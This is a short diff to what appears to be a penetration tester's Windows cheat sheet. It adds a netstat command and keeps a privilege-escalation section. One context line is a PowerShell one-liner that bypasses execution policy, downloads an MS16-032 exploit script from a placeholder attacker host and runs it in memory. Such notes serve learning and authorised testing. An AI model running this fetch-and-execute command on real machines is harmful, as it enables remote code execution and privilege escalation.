@@ -32,6 +32,9 @@ https://www.abatchy.com/2017/03/powershell-download-file-one-liners
 powershell.exe -ExecutionPolicy Bypass "IEX (New-Object Net.WebClient).DownloadString('http://<IP>:<port>/ms16-032.ps1'); Invoke-ms16-032"
   diskless powershell script upload & exec
   
+netstat -a -b
+  list all connections+the in-use application
+  
 --privesc--
 1. Who do we have access as?
   set | whoami /all
